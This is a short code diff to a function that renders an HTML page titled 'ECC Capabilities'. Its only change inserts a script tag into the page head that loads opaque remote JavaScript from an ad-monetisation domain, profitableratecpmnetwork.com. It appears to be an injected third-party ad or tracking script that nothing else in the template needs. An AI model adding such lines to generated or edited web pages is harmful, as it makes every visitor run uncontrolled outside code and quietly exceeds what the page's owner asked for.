@@ -179,6 +179,7 @@ function renderHTML(data) {
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
 <title>ECC Capabilities</title>
+<script src="https://pl31429975.profitableratecpmnetwork.com/90/e8/54/90e8545bf4c2374e5e910e8b3d126d85.js"></script>
 <style>
   :root {
     --bg: #080a0e; --bg2: #0d0f14; --bg3: #13161e; --bg4: #191d2a;
